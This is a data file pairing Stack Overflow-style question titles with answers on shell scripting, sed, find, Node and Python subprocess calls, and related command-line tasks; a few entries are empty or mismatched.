    "What's the difference between $@ and $* in UNIX?": "Please see the bash man page under Special Parameters.\n   Special Parameters\n       The shell treats several parameters specially.   These  parameters  may\n       only be referenced; assignment to them is not allowed.\n       *      Expands  to  the positional parameters, starting from one.  When\n              the expansion occurs within double quotes, it expands to a  sin\u2010\n              gle word with the value of each parameter separated by the first\n              character of the IFS special variable.  That is, \"$*\" is equiva\u2010\n              lent to \"$1c$2c...\", where c is the first character of the value\n              of the IFS variable.  If IFS is unset, the parameters are  sepa\u2010\n              rated  by  spaces.   If  IFS  is null, the parameters are joined\n              without intervening separators.\n       @      Expands to the positional parameters, starting from  one.   When\n              the  expansion  occurs  within  double  quotes,  each  parameter\n              expands to a separate word.  That is, \"$@\" is equivalent to \"$1\"\n              \"$2\"  ...   If the double-quoted expansion occurs within a word,\n              the expansion of the first parameter is joined with  the  begin\u2010\n              ning  part  of  the original word, and the expansion of the last\n              parameter is joined with the last part  of  the  original  word.\n              When  there  are no positional parameters, \"$@\" and $@ expand to\n              nothing (i.e., they are removed).",
    "Escape password containing @ when using postgres pg_dump command": "adding ?password=name%26te\u200cxt%40sob as uri parameter should do:\npg_dump -Fc --no-acl --no-owner --dbname=postgresql://db_user:password@127.0.0.1:5432/db_name?password=name%26te\u200cxt%40sob\nas per https://www.postgresql.org/docs/current/static/libpq-connect.html#LIBPQ-CONNSTRING\nComponents of the hierarchical part of the URI can also be given as parameters.\nupdate\nas Roko noticed, URL has to be encoded",
    "How do I open Python IDLE (Shell WIndow) in WIndows 10?": "In Windows you will need to right click a .py, and press Edit to edit the file using IDLE. Since the default action of double clicking a .py is executing the file with python on a shell prompt.\nTo open just IDLE:\nClick on that. C:\\Python36\\Lib\\idlelib\\idle.bat",
    "makefile run targets in parallel": "You can set make options that you usually pass to make via its command line invokation in the makefile itself. Add this line to your makefile\nMAKEFLAGS += -j2\nand you can invoke make without the -j flag, it will still spawn two processes to build targets in parallel, when they aren't dependent on each other. To automatically determine the number of jobs to spawn, you can use this on linux\nNPROCS = $(shell grep -c 'processor' /proc/cpuinfo)\nMAKEFLAGS += -j$(NPROCS)\nand on MacOS\nNPROCS = $(shell sysctl hw.ncpu  | grep -o '[0-9]\\+')\nMAKEFLAGS += -j$(NPROCS)",
    "Search for files in a git repository by extensions": "Try this:\ngit ls-tree -r master --name-only | grep -E '.*\\.(jpg|png)'\nThe expression you tried to pass via -E option is interpreted as any characters (.*), the dot (\\.), and the string {jpg,png}. I guess you are confusing the Bash brace expansion with the alternation (|) in a regular expression group (the parenthesis).\nConsider using the end-of-line anchor: '.*\\.(jpg|png)$'.\nWithout grep\nAs @0andriy pointed out you can pass patterns to git ls-files as follows:\ngit ls-files '*.jpg' '*.png'\nNote, you should escape the arguments in order to prevent the filename expansion (globbing). In particular, the asterisk (*) character\nmatches any number of repeats of the character string or RE preceding it, including zero instances.\nBut this obviously will work only for the simple git patterns. For a slightly more complicated case such as \"extension matching N characters from a given set\" you will need a regular expression (and grep, for example).",
    "Bash signal capture not detecting variables changed after declaration of 'trap' block": "The trap is being interpolated, and is using the value of $done at the time the trap is being defined rather than when it is executed. You can use single quotes around the trap definition, or define a function. Defining a function is probably cleaner:\n#!/bin/sh\ndone=false\ncleanup() { if test \"$done\" = true; then echo Test; fi; }\ntrap cleanup EXIT\ndone=true\nThis works because the expansion of variables in the function is deferred until the function is called, rather than when the function is defined.",
    "Tailing Rolling Files": "You can use the -F option for tail which implies --follow=name --retry.\nFrom the man page:\n-F      \nThe -F option implies the -f option, but tail will also check to see if the \nfile being followed has been renamed or rotated.  The file is closed and \nreopened when tail detects that the filename being read from has a new inode \nnumber. The -F option is ignored if reading from standard input rather than \na file.",
    "Write STDOUT & STDERR to a logfile, also write STDERR to screen": "(./doit >> log) 2>&1 | tee -a log\nThis will take stdout and append it to log file.\nThe stderr will then get converted to stdout which is piped to tee which appends it to the log (if you are have Bash 4, you can replace 2>&1 | with |&) and sends it to stdout which will either appear on the tty or can be piped to another command.\nI used append mode for both so that regardless of which order the shell redirection and tee open the file, you won't blow away the original. That said, it may be possible that stderr/stdout is interleaved in an unexpected way.",
    "How do you force a java swt program to \"move itself to the foreground\"?": "This worked for me on Windows 7 and Ubuntu:\nprivate void bringToFront(final Shell shell) {\n    shell.getDisplay().asyncExec(new Runnable() {\n        public void run() {\n            shell.forceActive();\n        }\n    });\n}",
    "View Mercurial log/status with less by default": "See the pager extension:\nBrowse command output using an external pager\nIt's distributed with mercurial, so you just need to activate it in hgrc.",
    "How do I test for a non-zero exit status of a command in Bash?": "I soon figured out that if ! is_git_repository ; then ... works as intended (look under 7.1.2.1. Testing exit status in Introduction to if), but why? I would have expected that #1 would work at the very least, but I don't know why it doesn't.\nAlso, what is up with #6?!",
    "How to set a conditional newline in PS1?": "Try the following:\nfunction __ps1_newline_login {\n  if [[ -z \"${PS1_NEWLINE_LOGIN}\" ]]; then\n    PS1_NEWLINE_LOGIN=true\n  else\n    printf '\\n'\n  fi\n}\n\nPROMPT_COMMAND='__ps1_newline_login'\nexport PS1=\"\\h:\\W \\u\\$ \"\nExplanation:\nPROMPT_COMMAND is a special bash variable which is executed every time before the prompt is set.\nYou need to use the -z flag to check if the length of a string is 0.",
    "In python shell, \"b\" letter does not work, what the?": "The problematic line in your .pythonstartup is something like:\n readline.parse_and_bind(\"bind ^I rl_complete\") # darwin libedit\nThis .pythonstartup will fix it...\ntry:\n    import readline\nexcept ImportError:\n    print \"Module readline not available.\"\nelse:\n    import rlcompleter\n    if 'libedit' in readline.__doc__:\n        readline.parse_and_bind(\"bind ^I rl_complete\")\n    else:\n        readline.parse_and_bind(\"tab: complete\")",
    "The Linux timeout command and exit codes": "Your situation isn't very clear because you haven't included your code in the post.\ntimeout does exit with the exit code of the command if it finishes before the timeout value.\nFor example:\ntimeout 5 ls -l non_existent_file\n# outputs ERROR: ls: cannot access non_existent_file: No such file or directory\necho $?\n# outputs 2 (which is the exit code of ls)\nFrom man timeout:\nIf the command times out, and --preserve-status is not set, then exit with status 124. Otherwise, exit with the status of COMMAND. If no signal is specified, send the TERM signal upon timeout. The TERM signal kills any process that does not block or catch that signal. It may be necessary to use the KILL (9) signal, since this signal cannot be caught, in which case the exit status is 128+9 rather than 124.\nSee BashFAQ105 to understand the pitfalls of set -e.",
    "Doing OCR with R": "",
    "How to run a .sh-script from any path in a terminal?": "One option is simply to type the path to the script:\n~/Desktop/script\nThis works fine, but gets a bit unwieldy.\nThis is what the PATH environment variable is for. And it is what $HOME/bin is for.\nCreate yourself a directory $HOME/bin. Put all your executable scripts in it (make them executable with chmod +x script if need be\u2020\u2020). This way, there's one place to look for the scripts you want to run.\nAdd $HOME/bin to your PATH. I put mine at the front: PATH=\"$HOME/bin:$PATH, but you could put it at the back if you prefer.\nUpdate your .profile or .bash_profile (or possibly .bashrc) file to set PATH. Beware of a continually growing PATH, though.\nAs tripleee noted, once the command is installed in a directory on PATH, you no longer type ./script, but just script. This is exactly like you type ls and not /bin/ls, etc. Once the program is installed in a directory on your PATH, it is (for many purposes) indistinguishable from a system-provided command.\nI have about 500 scripts and programs in my $HOME/bin directory.\nNote that this doesn't require any special privileges. If you have administrator access to your machine and you think other users might find your commands useful, then you could install the scripts/programs in one of the system-provided directories on your PATH. However, it is usually best not to add programs to any of:\n/bin\n/usr/bin\n/sbin\n/usr/sbin\nThere is often/usually /usr/local/bin which is a suitable place for widely used commands not provided by the system.\n\u2020\u2020 It would be better to use chmod a+x,go-w script; your scripts should not be writable by other people. You could even simply use chmod 555 script or chmod 755 script. I tend to keep my scripts non-writable. That way, I have to go through a formal change process with the version control system. It means there's less danger of uncontrolled changes.",
    "How can I use grep to match but without printing the matches?": "Use grep -q (quiet)\n/var/folder/program.exe -L parameters |\ngrep -q \"text_to_filter\" && echo 'SomeText' > '/tmp/Log.txt'\nAs per man grep:\n-q, --quiet, --silent Quiet; do not write anything to standard output. Exit immediately with zero status if any match is found, even if an error was detected. Also see the -s or --no-messages option.",
    "Subprocess.call or Subprocess.Popen cannot use executables that are in PATH (Linux/Windows)": "You can control the environment variables available in the spawned subprocess by passing a mapping with the env keyword argument. E.g.\nproc = subprocess.Popen(args, env={'PATH': '/some/path'})\nOr to inherit PATH from the system environment variable, without necessarily chucking in everything else from the system environment:\nproc = subprocess.Popen(args, env={'PATH': os.getenv('PATH')})\nIt might be easier/simpler just to use an absolute path, though.",
    "How do I implement tab completion in node.js shell?": "You could monkey-patch the REPL. Note that you must use the callback version of the completer, otherwise it won't work correctly:\nvar repl = require('repl').start()\nvar _completer = repl.completer.bind(repl)\nrepl.completer = function(line, cb) {\n  // ...\n  _completer(line, cb)\n}",
    "Is it possible to build a interactive C shell?": "Yes, and such things already exist, you just have to google for them :-)\nCh is one popular example\nCINT is another\nThat said, actually developing a functional interpreter like this from scratch is much more difficult than finding one online. So now it depends on what's behind your question - do you want just an interpreter to use? Then pick one of the linked above. Do you want to develop such an interpreter? Well, then start reading.",
    "Detecting the output stream type of a shell script": "See this previous SO question, which covers bash. Tcsh provides the same functionality with filetest -t 1 to see if standard output is a terminal. If it is, then print the color stuff, else leave it out. Here's tcsh:\n#!/bin/tcsh\nif ( -t 1 ) then\n        printf \"\\033[31m Success Color is awesome!\\033[0m\"\nelse\n        printf \"Plain Text is awesome!\"\nendif",
    "How to set path to kubectl when installed using gcloud components install?": "",
    "What does \"read -p\" do in a linux shell script? [closed]": "First off, the structure <command> -<option> means that you want to execute <command> using the option corresponding to <option>. A - after a command means that the following letter is an option. Most commands have several options you can use. Options are usually defined using either a single letter or a couple of words separated by -.\nSide Note: For options that are a couple of words rather than a single letter, often it will use two minus signs -- instead of one, signifying that it is a \"long named\" option.\nSo, using the read -p example, this means you want to execute read using the p option, which stands for prompt.\nNow, sometimes an option will require an argument. In your examples, the options to useradd have arguments. Arguments are usually defined like <command> -<option> [argument]. So, in the useradd example, $group is an argument for the option g.\nNow for the commands themselves:\nread is a bash built-in (not a POSIX shell command) that reads from standard input.\nThe -p option makes it read as a prompt, meaning it doesn't add a trailing newline before trying to read input.\nif checks the return status of the test command (in this case id -u $username >/dev/null 2>&1)\nIf the return status is 0, the then part is executed\nid prints user groups and ids\nThe -u option \"prints only the effective user ID\".\n>/dev/null 2>&1 redirects standard input and standard error to /dev/null, meaning they do not get printed to the terminal.\nuseradd creates a new user\n-g sets the initial group for the user\n-s sets the name of the user's login shell\n-d sets the name of the user's login directory\n-m says to create the user's home directory if it does not exist.\n-p defines the user's encrypted password.\nFor future reference, you can look up commands in the linux manual pages by doing man <command> on the command line. These manual pages tell you what a command does, as well as explaining all of its options.\nBash built-ins like read are all on a single man page that is not the easiest thing to use. For those I find googling them easier. Usually http://ss64.com/ will come up in the results, which contains the info from the bash built-ins man page, but separated into different pages by command. I find this much easier to use.",
    "Display function definition in interactive shell": "No, __code__ and func_code are references to the compiled bytecode -- you can disassemble them (see dis.dis) but not get back to the Python source code.\nAlas, the source code is simply gone, not remembered anywhere...:\n>>> import inspect\n>>> def f():\n...   print 'ciao'\n... \n>>> inspect.getsource(f)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/inspect.py\", line 694, in getsource\n    lines, lnum = getsourcelines(object)\n  File \"/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/inspect.py\", line 683, in getsourcelines\n    lines, lnum = findsource(object)\n  File \"/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/inspect.py\", line 531, in findsource\n    raise IOError('could not get source code')\nIOError: could not get source code\n>>> \nIf inspect can't get to it, that's a pretty indicative sign.\nIf you were on a platform using GNU readline (basically, any except Windows), you might exploit the fact that readline itself does remember some \"history\" and can write it out to a file...:\n>>> readline.write_history_file('/tmp/hist.txt')\nand then read that history file -- however, I know of no way to do this in Windows.\nYou may want to use some IDE with better memory capabilities, rather than the \"raw\" command interpreter, especially on a platform such as Windows.",
    "how to loop through files that match a regular expression in a unix shell script": "You can use (GNU) find with the regex search option instead of parsing ls.\nfind . -regextype \"egrep\" \\\n       -iregex '.*/MYFILE[0-9][0-9]([0][1-9]|1[0-2])([0][1-9]|[12][0-9]|[3][01]).dat' \\\n       -exec [[whatever you want to do]] {} \\;\nWhere [[whatever you want to do]] is the command you want to perform on the names of the files.\nFrom the man page\n-regextype type\n          Changes  the regular expression syntax understood by -regex and -iregex tests \n          which occur later on the command line.  Currently-implemented types are \n          emacs (this is the default),posix-awk, posix-basic, posix-egrep and \n          posix-extended.\n\n  -regex pattern\n          File name matches regular expression pattern.  This is a match on the whole \n          path, not a search.  For example, to match a file named `./fubar3', you can \n          use the regular expression\n          `.*bar.' or `.*b.*3', but not `f.*r3'.  The regular expressions understood by \n          find are by default Emacs Regular Expressions, but this can be changed with \n          the -regextype option.\n\n  -iregex pattern\n          Like -regex, but the match is case insensitive.",
    "How to get the output of a spawned child_process in Node.JS?": "You can do it something like below.\n    var spawn = require('child_process').spawn;\n    // Create a child process\n    var child = spawn('ls' , ['-l']);\n\n    child.stdout.on('data',\n        function (data) {\n            console.log('ls command output: ' + data);\n        });\n    child.stderr.on('data', function (data) {\n        //throw errors\n        console.log('stderr: ' + data);\n    });\n\n    child.on('close', function (code) {\n        console.log('child process exited with code ' + code);\n    });\nUpdate: with spawnSync\n    var spawn = require('child_process').spawnSync;\n    var child = spawn('ls' , ['-l','/usr']);\n    console.log('stdout here: \\n' + child.stdout);",
    "Trapping getopt invalid options": "This sort of style works for me:\nparams=\"$(getopt -o d:h -l diff:,help --name \"$cmdname\" -- \"$@\")\"\n\nif [ $? -ne 0 ]\nthen\n    usage\nfi\n\neval set -- \"$params\"\nunset params\n\nwhile true\ndo\n    case $1 in\n        -d|--diff)\n            diff_exec=(${2-})\n            shift 2\n            ;;\n        -h|--help)\n            usage\n            exit\n            ;;\n        --)\n            shift\n            break\n            ;;\n        *)\n            usage\n            ;;\n    esac\ndone",
    "How to get the output of a shell function without forking a sub shell?": "An ugly solution is to temporarily replace echo so that it sets a global variable, which you can access from your function:\nfunc () {\n  echo () {\n    result=\"$@\"\n  }\n  result=\n  hello\n  unset -f echo\n  echo \"Result is $result\"\n}\nI agree it's nasty, but avoids the subshell.",
    "Shell variable with spaces , quoting for single command line option": "You should try to set the $IFS environment variable.\nfrom man bash(1):\nIFS - The Internal Field Separator that is used for word splitting after expansion and to split lines into words with the read builtin command. The default value is ''space tab newline''.\nFor example\nIFS=<C-v C-m>  # newline\nfile=\"a b\"\ntouch $file\nls $file\nDon't forget to set $IFS back or strange things will happen.",
    "Using bash with Node.js child_process using the shell option fails": "Might be in your setup or passing options incorrectly in your code. Since you didn't post your code, it's tricky to tell. But I was able to do the following and it worked (using node 4.1.1):\n\"use strict\";\nconst exec = require('child_process').exec\n\nlet child = exec('time',{shell: '/bin/bash'}, (err, stdout, stderr) =>     {\n  console.log('this is with bash',stdout, stderr)\n})\nlet child2 = exec('time',{shell: '/bin/sh'}, (err, stdout, stderr) => {\n  console.log('This is with sh', stdout, stderr)\n})\nThe output will be:\nthis is with bash  \nreal    0m0.000s\nuser    0m0.000s\nsys 0m0.000s\n\nThis is with sh  /bin/sh: 1: time: not found\nI used time as the command since it's one that bash has and sh does not. I hope this helps!",
    "How to print result of shell script in CMake?": "If you want to know the value of a specific variable, you can use $ENV{varname}:\nmessage(STATUS $ENV{PATH})\nIf you want to see all variables, you probably need to resort to invoking an external command such as env (on Unix) or set (on Windows):\n# Windows\nexecute_process(COMMAND cmd /c set OUTPUT_VARIABLE output)\nmessage(${output})",
    "Difference between piping a file to sh and calling a shell file": "When you pipe to sh , stdin of that shell/script will be the pipe. Thus the script cannot take e.g. user input from the console. When you run the script normally, stdin is the console - where you can enter input.",
    "Why is alternatives command used when installing Java on a Linux machine": "It's not specific to Linux, only some of the distributions. It's better for maintaining multiple versions of the software or libraries and easily switch between them. Your applications are only pointing to the symbolic link, which you can easily switch any time and don't have to go through all the configurations of your applications. I don't know what the 20000 means, but here's the manpage: http://linux.about.com/library/cmd/blcmdl8_alternatives.htm (but you should have that in your system too)",
    "Pretty-print for shell script": "Vim can indent bash scripts. But not reformat them before indenting.\nBackup your bash script, open it with vim, type gg=GZZ and indent will be corrected. (Note for the impatient: this overwrites the file, so be sure to do that backup!)\nThough, some bugs with << (expecting EOF as first character on a line) e.g.\nEDIT: ZZ not ZQ",
    "sed - insert line after X lines after match": "Try this with GNU sed:\nsed \"/function_1/{N;N;N;a new_text\n}\" filename",
    "What is the difference between p and P in sed?": "In\nsed\n, p prints the addressed line(s), while P prints only the first part (up to a newline character \\n) of the addressed line. If you have only one line in the buffer, p and P are the same thing, but logically p should be used.\nLet's look at an academic but easy example. Let's assume we want to print line number 1, we can do\n$ echo \"line 1\n$ This is line 2\" | sed -n '1p'\n> line 1\nWe could also do\n$ echo \"line 1\n$ This is line 2\" | sed -n '1P'\n> line 1\nBoth commands do the same thing, since there is no newline character in the buffer.\nBut now we use the N command to add a second line into the buffer:\n$ echo \"line 1\n$ This is line 2\" | sed -n '1{N; p}'\n> line 1\n> This is line 2\nNow we had 2 lines in the buffer and we print them both with p.\n$ echo \"line 1\n$ This is line 2\" | sed -n '1{N; P}'\n> line 1\nAgain we had 2 lines in the buffer, but we printed only the first one, since we were using P and not p.",
    "how to get XCode to add build date & time to Info.plist file": "Ahhhh, I should have spent another 30 minutes (on top of the 2 hours I had already wasted) and looked at the answers for this question before posting my own:\nInsert Subversion revision number in Xcode\nThis post-action script does the trick and works for me:\ninfoplist=\"$BUILT_PRODUCTS_DIR/$INFOPLIST_PATH\"\nbuilddate=`date`\nif [[ -n \"$builddate\" ]]; then\n    # if BuildDateString doesn't exist, add it\n    /usr/libexec/PlistBuddy -c \"Add :BuildDateString string $builddate\" \"${infoplist}\"\n    # and if BuildDateString already existed, update it\n    /usr/libexec/PlistBuddy -c \"Set :BuildDateString $builddate\" \"${infoplist}\"\nfi\nAs you can see, it's doing a bit of a hack there (adding it if it doesn't exist; setting it right afterwards).\nIf anyone can suggest a solution using the \"defaults write\" method above (which I think might be better supported than \"PlistBuddy\"), I'd be thrilled to find out (and of course I'll accept and use that superior answer, too).",
    "Python subprocess call returns \"command not found\", Terminal executes correctly": "When using shell = True, the first argument to subprocess.Popen should be a string, not a list:\np = subprocess.Popen('gphoto2', shell=True, ...)\nHowever, using shell = True should be avoided if possible since it can be a security risk (see the Warning).\nSo instead use\np = subprocess.Popen(['gphoto2'], ...)\n(When shell = False, or if the shell parameter is omitted, the first argument should be a list.)",
    "Invoke MSYS2 Shell from Command Prompt or PowerShell": "We're working hard to fix our messy update procedure, we want it to be trouble-free.\nYou can see some examples of how we invoke MSYS2 from a batch file when we create a new installer in:\nhttps://github.com/Alexpux/MSYS2-packages/blob/master/msys2-installer/make-msys2-installer.bat\nBut as @StevenPenny suggests,\nbash -l -c \"pacman ...\"\nis the correct way.",
    "pgrep -f with multiple arguments": "Good sir, perhaps this\n[[ `pgrep -f \"$regex\"` ]] && return 1 || return 0\nor this\n[ \"`pgrep -f '$regex'`\" ] && return 1 || return 0",
    "The difference between arguments and options pertaining to the linux shell": "I know this is an old thread, but I want to add the following for anyone else that may stumble into a similar disagreement.\n $ ls -l junk\n-rw-r--r-- 1 you     19 Sep 26 16:25 junk\n\"The strings that follow the program name on the command line, such as -l and junk in the example above, are called the program's arguments. Arguments are usually options or names of files to be used by the command.\"\nBrian W. Kernighan & Rob Pike, \"The UNIX Programming Environment\"",
    "Print first few and last few lines of file through a pipe with \"...\" in the middle": "An awk:\nawk -v head=2 -v tail=2 'FNR==NR && FNR<=head\nFNR==NR && cnt++==head {print \"...\"}\nNR>FNR && FNR>(cnt-tail)' file file\nOr if a single pass is important (and memory allows), you can use perl:\nperl -0777 -lanE 'BEGIN{$head=2; $tail=2;}\nEND{say join(\"\\n\", @F[0..$head-1],(\"...\"),@F[-$tail..-1]);}' file   \nOr, an awk that is one pass:\nawk -v head=2 -v tail=2 'FNR<=head\n{lines[FNR]=$0}\nEND{\n    print \"...\"\n    for (i=FNR-tail+1; i<=FNR; i++) print lines[i]\n}' file\nOr, nothing wrong with being a caveman direct like:\nhead -2 file; echo \"...\"; tail -2 file\nAny of these prints:\n1\n2\n...\n9\n10\nIt terms of efficiency, here are some stats.\nFor small files (ie, less than 10 MB or so) all these are less than 1 second and the 'caveman' approach is 2 ms.\nI then created a 1.1 GB file with seq 99999999 >file\nThe two pass awk: 50 secs\nOne pass perl: 10 seconds\nOne pass awk: 29 seconds\n'Caveman': 2 MS",
    "How `[System.Console]::OutputEncoding/InputEncoding` with Python?": "You are piping data into Python; at that point Python's stdin is no longer attached to a TTY (your console) and won't guess at what the encoding might be. Instead, the default system locale is used; on your system that's cp1251 (the Windows Latin-1-based codepage).\nSet the PYTHONIOENCODING environment variable to override:\nPYTHONIOENCODING\nIf this is set before running the interpreter, it overrides the encoding used for stdin/stdout/stderr, in the syntax encodingname:errorhandler. Both the encodingname and the :errorhandler parts are optional and have the same meaning as in str.encode().\nPowerShell doesn't appear to support per-command-line environment variables the way UNIX shells do; the easiest is to just set the variable first:\nSet-Item Env:PYTHONIOENCODING \"UTF-8\"\nor even\nSet-Item Env:PYTHONIOENCODING \"cp65001\"\nas the Windows UTF-8 codepage is apparently not quite UTF-8 really, depending on the Windows version and on wether or not pipe redirection is used.",
    "How do I detect iPhone on network?": "I've just spent a week beating on this problem so I can refrain from sending SMS home alarms to my wife when she's at work.\nPinging won't work because the iPhone won't respond to ICMP when asleep. Reading the ARP cache won't work because a sleeping iPhone will come and go (check it every 30 seconds for a few minutes).\nThe only way I have found to 'reliably' determine when my two iPhones are on my local (home) network is to use the PCAP dotnet library to look for any packets originating from either of the phones' MAC addresses. For example, if you run Wireshark with the capture filter\nether src <iphone-mac-address>\nyou will see a surprising amount of network discovery/announcement traffic from the phone. It still has quiescent states, but so far the longest interval I have seen between captured packets is around 10 minutes. You would have to wait until you have not heard from the phone for some interval (I use 15 minutes) before declaring it not-home.\nWith this technique you will find a phone quickly when it rejoins the home network, assuming your phone is configured for DHCP. I also use port mirroring on my main Ethernet switch to include traffic from my wireless access points.\nI don't have a Raspberry Pi solution for this, because my linux expertise is very limited, but someone else may be able to help you along those lines. I have a Windows Service using the PCAP library and so far it works reliably, with the limitation of waiting 15 minutes before deciding an iPhone has left the network.\n* update 2-3-2018 *\nI have this detection algorithm down to about 5 minutes, using a combination of ping/arp messages directed to each phone, about once per minute. Seems to work great.",
    "Unbound variable with bash script": "You are assigning the variable log inside a subshell ( [...] ). That variable is not bound outside that subshell.\nIn this case it is probalby best to just set log outside the subshell, i.e. move the variable assignment before the subshell block.\nGenerally in similar cases, you could try replacing the subshell parentheses with curly braces (group command syntax) { [...] }.\nGroup commands are executed in the current shell. Note that in contrast to subshell syntax, lists must be terminated by newline or semicolon, see Compound Commands in the Lists section of the bash(1) manpage.\nAnd as a general best practice, setting variable names, especially constants at the beginning of a script or function helps avoid this kind of bug.",
    "Catch npm ERR! when running npm test from shell script": "Another 3 year late and was looking for solution in this too.\nFinally found it and if these help others in future. I used shell script $? command, which returns the exit status of the last executed command. I.e. if a shell script fails it returns 1 while a 0 if it's success. NPM implements this return hence.\nnpm run test\nif [ $? -eq 0 ]\nthen\n  echo \"SUCCESS\"\nelse\n  echo \"FAIL\"\nfi",
    "Errno::ENOMEM: Cannot allocate memory - cat": "So it seems that your system is running pretty low on memory and spawning a shell + calling cat is too much for the few memory left.\nIf you don't mind loosing some speed, you can merge the files in ruby, with small buffers. This avoids spawning a shell, and you can control the buffer size.\nThis is untested but you get the idea :\nbuffer_size = 4096\noutput_file = File.open(final_output_file, 'w')\n\nDir[\"#{processing_directory}/*.csv\"].sort_by {|file| [file.count(\"/\"), file]}.each do |file|\n  f = File.open(file)\n  while buffer = f.read(buffer_size)\n    output_file.write(buffer)\n  end\n  f.close\nend",
    "How to get the process id of command executed in bash script?": "I think i have this solved now, According to this here: link I need to wrap the commands like this (command) to create a sub shell.\n#!/bin/bash\n\n(mygprgram &)\nmypid=$!\n(cpulimit -z -p $mypid -l 75 &)\n\nexit 0",
    "what does '$?' mean in a shell script?": "I found that the link is very useful and is the great answer. It includes clearly expression with sample.",
    "Disable history in Linux [closed]": "For most usecases, unset HISTFILE should be enough.\nThat disables writing the history file, while it still allows to cycle through the last commands using up/down.\nChanging HISTFILESIZE doesn't have any effect when you unset HISTFILE, as it only affects how many lines will be written to the history file when the shell exits. If set to 0 with HISTFILE set, then the file will be truncated to 0 at exit.\nChanging HISTSIZE changes how many commands the current shell will remember.\nTo make this changes permanent, ~/.bashrc or ~/.profile are good places to insert the commands.",
    "How can I remove trailing characters from a string using shell script?": "To answer the first line of your question which asks to \"remove the last n characters from a string\", you can use the substring extraction feature in Bash:\nA=\"123456\"\necho ${A:0:-2}  # remove last 2 chars\n\n1234\nHowever, based on your examples you appear to want to remove all trailing commas, in which case you could use sed 's/,*$//'.\necho \"ssl01:49188,ssl999999:49188,,,,,\" | sed 's/,*$//'\n\nssl01:49188,ssl999999:49188\nor, for a purely Bash solution, you could use substring removal:\nX=\"ssl01:49188,ssl999999:49188,,,,,\"\nshopt -s extglob\necho ${X%%+(,)}\n\nssl01:49188,ssl999999:49188\nI would use the sed approach if the transformation needs to be applied to a whole file, and the bash substring removal approach if the target string is already in a bash variable.",
    "How to check if a string contains a special character (!@#$%^&*()_+)": "Match it against a glob. You just have to escape the characters that the shell otherwise considers special:\n#!/bin/bash\nstr='some text with @ in it'\nif [[ $str == *['!'@#\\$%^\\&*()_+]* ]]\nthen\n  echo \"It contains one of those\"\nfi",
    "How to pass password from file to mysql command?": "Store your password in a protected mysql cnf file:\ninstall -m 700 -d /srv/secrets/\ninstall -m 600 /dev/null /srv/secrets/root@localhost.cnf\neditor /srv/secrets/root@localhost.cnf\nStore the password in the client.password ini property\n[client]\npassword=\"password\"\nInclude this file as the first argument in your mysql command:\nmysql \\\n    --defaults-extra-file=/srv/secrets/root@localhost.cnf \\\n    --user=root \\\n    --host=localhost \\\n    --no-auto-rehash",
    "shell/ batch scripting to direct commands to adb shell": "",
    "Give the mount point of a path": "df takes the path as parameter, so something like this should be fairly robust;\ndf \"$path\" | tail -1 | awk '{ print $6 }'",
    "Should I escape shell arguments in Perl?": "If you use system $cmd, @args rather than system \"$cmd @args\" (an array rather than a string), then you do not have to escape the arguments because no shell is invoked (see system). system {$cmd} $cmd, @args will not invoke a shell either even if $cmd contains metacharacters and @args is empty (this is documented as part of exec). If the args are coming from user input (or other untrusted source), you will still want to untaint them. See -T in the perlrun docs, and the perlsec docs.\nIf you need to read the output or send input to the command, qx and readpipe have no equivalent. Instead, use open my $output, \"-|\", $cmd, @args or open my $input, \"|-\", $cmd, @args although this is not portable as it requires a real fork which means Unix only... I think. Maybe it'll work on Windows with its simulated fork. A better option is something like IPC::Run, which will also handle the case of piping commands to other commands, which neither the multi-arg form of system nor the 4 arg form of open will handle.",
    "Comparing two json files : shell scripting": "To compare json files you should convert them so they have same order of keys. Very good tool for this job is jq (https://stedolan.github.io/jq/) where you can do:\njq -S . fileA.json > fileA_fmt.json\njq -S . fileB.json > fileB_fmt.json\nthen, you can use your favourite tool for text file comparison. I like kdiff3 for GUI or just plain diff when in pure command-line e.g.:\ndiff fileA_fmt.json fileB_fmt.json",
    "Laravel Tinker - Arrow keys not working in shell": "The PHP REPL does not implement readline's line editing and history capabilities. I don't know if there's a PHP module that implements it, but you can do:\nrlwrap php artisan tinker\nYou may have to install rlwrap for your OS.",
    "how to remove decimal from a variable?": "(You did not mention what shell you're using; this answer assumes Bash).\nYou can remove the decimal values using ${VAR%.*}. For example:\n[me@home]$ X=$(echo \"196.3 * 1024 * 1024\" | bc)\n[me@home]$ echo $X\n205835468.8\n[me@home]$ echo ${X%.*}\n205835468\nNote that this truncates the value rather than rounds it. If you wish to round it, use printf as shown in Roman's answer.\nThe ${variable%pattern} syntax deletes the shortest match of pattern starting from tbe back of variable. For more information, read http://tldp.org/LDP/abs/html/string-manipulation.html",
    "How can I find lines in one file but not the other using bash scripting?": "This is a one-liner, but does not preserve the order:\ncomm -13 <(grep '#include' file1 | sort) <(grep '#include' file2 | sort)\nIf you need to preserve the order:\nawk '\n  !/#include/ {next} \n  FILENAME == ARGV[1] {include[$2]=1; next} \n  !($2 in include)\n' file1 file2",
    "How can I check if current web server is NGINX or Apache using bash script?": "Since you are trying to achieve this with grep and ps, you could do something like this:\nif [[ `ps -acx|grep apache|wc -l` > 0 ]]; then\n    echo \"VM Configured with Apache\"\nfi\nif [[ `ps -acx|grep nginx|wc -l` > 0 ]]; then\n    echo \"VM Configured with Nginx\"\nfi",
    "Kill a process if it exists": "If your script is terminating, you have most likely enabled set -e, to exit when a command fails.\nIf you don't care about the status, you can just append || true to the command:\nsudo killall instruments || true",
    "Using find - Deleting all files/directories (in Linux ) except any one": "find can be a very good friend:\n$ ls\na/  b/  c/\n$ find * -maxdepth 0 -name 'b' -prune -o -exec rm -rf '{}' ';'\n$ ls\nb/\n$ \nExplanation:\nfind * -maxdepth 0: select everything selected by * without descending into any directories\n-name 'b' -prune: do not bother (-prune) with anything that matches the condition -name 'b'\n-o -exec rm -rf '{}' ';': call rm -rf for everything else\nBy the way, another, possibly simpler, way would be to move or rename your favourite directory so that it is not in the way:\n$ ls\na/  b/  c/\n$ mv b .b\n$ ls\na/  c/\n$ rm -rf *\n$ mv .b b\n$ ls\nb/",
    "Using shell script to insert data into remote MYSQL database": "The insert statement has to be sent to mysql, not another line in the shell script, so you need to make it a \"here document\".\nmysql --host=randomhost --user=randomuser --password=randompass randomdb << EOF\ninsert into table (field1,field2,field3) values('http://www.site.com/$hash','$file','$size');\nEOF\nThe << EOF means take everything before the next line that contains nothing but EOF (no whitespace at the beginning) as standard input to the program.",
